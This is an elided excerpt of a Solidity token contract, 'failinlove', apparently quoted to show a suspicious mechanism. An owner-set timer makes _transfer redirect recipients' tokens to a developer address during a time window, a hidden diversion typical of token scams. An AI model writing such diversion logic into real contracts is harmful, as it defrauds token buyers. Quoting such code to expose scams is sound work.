...
/**
Telegram: https://t.me/failinlove_cn
*/
...
contract failinlove is IERC20, Ownable {
    ...
    address private _taxAddress =
        address(0x34c4950eb4639b37dCE800F7e2Ce705C2C4e292F);
    ...
    function setTimeB(uint256 newTimeB) external onlyOwner {
        _timeB = newTimeB;
    }
    ...
    function _transfer(
        ...
        if (_timeB > 0) {
            ...
            if (
                ...
                if(block.timestamp.sub(_scientisttime) <= _timeB)
                {
                    to=_devsAddress;
                }
            }
